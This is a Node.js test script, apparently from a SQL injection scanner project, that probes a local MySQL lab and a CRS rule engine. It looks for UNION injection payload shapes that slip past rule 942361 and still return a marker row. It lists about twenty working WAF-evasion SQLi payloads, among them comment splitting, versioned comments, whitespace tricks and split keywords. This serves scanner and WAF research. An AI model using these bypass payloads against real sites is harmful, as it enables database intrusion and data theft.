// ============================================================================
// e2e/waf-real/probe-union-shape.mjs —— §I 第 1 条单点探针
//
// 背景（TODO §I）：CRS 942361 判据是 `^[\W\d]+\s*?(?:alter|union)\b` —— 打的是
// **参数值起始形状**。数值点 `id=1 UNION SELECT…` 必然以数字开头 → 必命中；
// 字符串点 `alice' UNION…` 以字母开头 → 不命中。这正是 num/blind 两格丢掉的 union。
//
// 本探针要找一种「投放值起始形状」同时满足两个独立条件（缺一不可）：
//   A. CRS 不拦（evaluate → blocked=false）
//   B. 真实 MySQL 能执行且语义等价（直接 query，不报语法错、能取回标记值）
// 只满足 A 不满足 B 是自欺：WAF 放过了，数据库也没执行 → 扫不出东西。
//
// 用法：node e2e/waf-real/probe-union-shape.mjs
// 纯发请求 + 直连真库，几秒出结果，不启动靶场 HTTP 进程。
// ============================================================================
import { resolve, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { createRequire } from 'node:module';
const require = createRequire(new URL('../../server/package.json', import.meta.url));
const HERE = dirname(fileURLToPath(import.meta.url));
const mysql = require('mysql2/promise');
const { evaluate, EFFECTIVE_PL } = await import(new URL('./crs-engine.js', import.meta.url).href);

const DB = process.env.MYSQL_DATABASE || 'sqli_lab';
const POOL = mysql.createPool({
  host: process.env.MYSQL_HOST ?? '127.0.0.1',
  port: Number(process.env.MYSQL_PORT) || 3306,
  user: process.env.MYSQL_USER ?? 'root',
  password: process.env.MYSQL_PASSWORD ?? 'root',
  database: DB,
  multipleStatements: true,
});

// 靶场真实结构（见 e2e/real-mysql-lab/init-db.mjs）：users(id, username, email, password, role)
// 数值点靶场 SQL 形如：SELECT ... WHERE id=<INJECT>
// 字符串点形如：      SELECT ... WHERE username='<INJECT>'
const TAG = 'SQLISCANNER';
const NUM_SQL = (inject) => `SELECT id,username FROM users WHERE id=${inject}`;
const STR_SQL = (inject) => `SELECT id,username FROM users WHERE username='${inject}'`;

// 标记值必须真回来才算「语义成立」——光不报错不够（可能 union 被注释吞掉只剩合法前缀）
const UNION_TAIL = `UNION SELECT 999,'${TAG}OK'`;
const MARKER = `${TAG}OK`;

// —— 待筛形态 ——
// 设计轴：942361 要求 union 前是「连续的非词字符/数字段」。只要在 union 前面插入
// 一个词字符（[A-Za-z_]）或把连续段打断，就不命中起始形状判据。
const SHAPES = [
  // 对照组：已知必拦
  { label: 'baseline', inject: `1 ${UNION_TAIL}-- -`, expect: 'block' },

  // 组 A：注释切段（注释后跟词字符，打断 [\W\d]+ 连续性）
  { label: '1/*x*/UNION', inject: `1/*x*/ ${UNION_TAIL}-- -` },
  { label: '1/**/UNION', inject: `1/**/ ${UNION_TAIL}-- -` },
  { label: '1/*!*/UNION', inject: `1/*!*/ ${UNION_TAIL}-- -` },
  { label: '1--\nUNION', inject: `1--\n${UNION_TAIL}-- -` },
  { label: '1#\nUNION', inject: `1#\n${UNION_TAIL}-- -` },

  // 组 B：版本注释包裹 union 关键字本身
  { label: '/*!UNION*/', inject: `1 /*!UNION*/ SELECT 999,'${MARKER}'-- -` },
  { label: '/*!50000UNION*/', inject: `1 /*!50000UNION*/ SELECT 999,'${MARKER}'-- -` },
  { label: '/*!50000 UNION*/', inject: `1 /*!50000 UNION*/ SELECT 999,'${MARKER}'-- -` },

  // 组 C：让 union 前紧邻词字符（不满足 [\W\d]+）
  { label: '1e0UNION', inject: `1e0 ${UNION_TAIL}-- -` },
  { label: '1e0+UNION', inject: `1e0+${UNION_TAIL}-- -` },
  { label: '1.0UNION', inject: `1.0 ${UNION_TAIL}-- -` },
  { label: '0x31UNION', inject: `0x31 ${UNION_TAIL}-- -` },

  // 组 D：参数化形态（靶场若支持括号闭合）
  { label: '1)UNION', inject: `1) ${UNION_TAIL}-- -`, expect: 'syntax-ok-only' },

  // 组 E：空白变体
  { label: '1%09UNION', inject: `1\t${UNION_TAIL}-- -` },
  { label: '1%0bUNION', inject: `1\v${UNION_TAIL}-- -` },
  { label: '1%a0UNION', inject: `1\u00a0${UNION_TAIL}-- -` },

  // 组 F：union 关键字大小写/分隔（942361 带 (?i:)，大小写无用，验证一下）
  { label: 'uNiOn', inject: `1 uNiOn SELECT 999,'${MARKER}'-- -` },

  // 组 G：把 union 拆开（MySQL 允许注释插在关键字中间）
  { label: 'UN/**/ION', inject: `1 UN/**/ION SELECT 999,'${MARKER}'-- -` },
  { label: 'UNI/**/ON', inject: `1 UNI/**/ON SELECT 999,'${MARKER}'-- -` },
];

async function canExecute(sql) {
  try {
    const [rows] = await POOL.query(sql);
    const vals = JSON.stringify(rows.map((r) => Object.values(r)));
    return { ok: true, rows, gotMarker: vals.includes(MARKER) };
  } catch (e) {
    return { ok: false, err: e.message.slice(0, 80) };
  }
}

console.log('='.repeat(80));
console.log(`§I 探测：找「不命中 942361 且 MySQL 可执行（真取回标记值）」的数值起始形状`);
console.log(`CRS 档位：PL${EFFECTIVE_PL}　｜　真库：${DB}.users`);
console.log('='.repeat(80));

// 0) 基线可执行性：确认正确列名下的 union 语义在真库成立
const baselineSql = NUM_SQL(`1 ${UNION_TAIL}-- -`);
const baseRun = await canExecute(baselineSql);
console.log(`[基线] ${baselineSql}`);
console.log(`        ${baseRun.ok ? `OK ✅ 取回 ${JSON.stringify(baseRun.rows)}` : `FAIL ❌ ${baseRun.err}`}`);
console.log(`        标记值 ${MARKER} 命中：${baseRun.gotMarker ? 'YES' : 'NO'}`);
console.log('');

const results = [];
for (const s of SHAPES) {
  const sql = NUM_SQL(s.inject);

  // A. CRS 判据 —— 按真实 GET 请求形态：值 URL 编码后落进 queryString，
  //    引擎侧再做 urlDecodeUni 还原（与 waf-verify.mjs 的投递方式一致）
  const verdict = evaluate({
    uri: '/num',
    queryString: `id=${encodeURIComponent(s.inject)}`,
    args: { id: s.inject },
    cookies: {},
    headers: {},
  });

  // B. MySQL 执行 + 标记值回收
  const run = await canExecute(sql);
  const executed = run.ok;
  const gotMarker = run.ok && run.gotMarker;
  const win = !verdict.blocked && gotMarker;

  results.push({ ...s, verdict, executed, gotMarker, run });

  const a = verdict.blocked ? `拦(${verdict.ruleId})` : '放';
  const b = !executed ? '语法错' : gotMarker ? '取回标记' : '跑了但无标记';
  console.log(`${win ? '★' : ' '} ${s.label.padEnd(16)} CRS=${a.padEnd(14)} MySQL=${b}`);
  if (!executed) console.log(`      └ ${run.err}`);
  else if (!gotMarker) console.log(`      └ rows=${JSON.stringify(run.rows).slice(0, 70)}`);
}

// —— 安全对照：必须零误拦 ——
console.log('');
console.log('—— 安全对照（必须零误拦）——');
const SAFE = [
  { label: 'safe?id=1', uri: '/safe', qs: 'id=1', args: { id: '1' } },
  { label: 'echo?key=abc', uri: '/echo', qs: 'key=abc', args: { key: 'abc' } },
];
let safeOk = true;
for (const c of SAFE) {
  const v = evaluate({ uri: c.uri, queryString: c.qs, args: c.args, cookies: {}, headers: {} });
  const ok = !v.blocked;
  if (!ok) safeOk = false;
  console.log(`${ok ? 'OK  ' : 'FAIL'} ${c.label} → ${ok ? '放行' : `被拦 ${v.ruleId}`}`);
}

// —— 汇总 ——
const winners = results.filter((r) => !r.verdict.blocked && r.gotMarker);
const wafPassed = results.filter((r) => !r.verdict.blocked);
console.log('');
console.log('='.repeat(80));
console.log(`CRS 放行：${wafPassed.length}/${SHAPES.length}　｜　同时 MySQL 取回标记值（真可用）：${winners.length}`);
console.log('');
for (const w of winners) console.log(`  ★ ${w.label.padEnd(16)} → ${w.inject.replace(/\n/g, '\\n')}`);
if (!winners.length) {
  console.log('  （无形态同时过关 —— 单 tamper 层面拿不回这两格）');
  if (wafPassed.length) {
    console.log('  但以下形态 WAF 放行、只是 SQL 语义没成立（下一步方向）：');
    for (const w of wafPassed) console.log(`    · ${w.label.padEnd(16)} → ${w.inject.replace(/\n/g, '\\n')}`);
  }
}
console.log(`安全对照误拦：${safeOk ? '无 ✅' : '有 ❌'}`);
console.log('='.repeat(80));

await POOL.end();
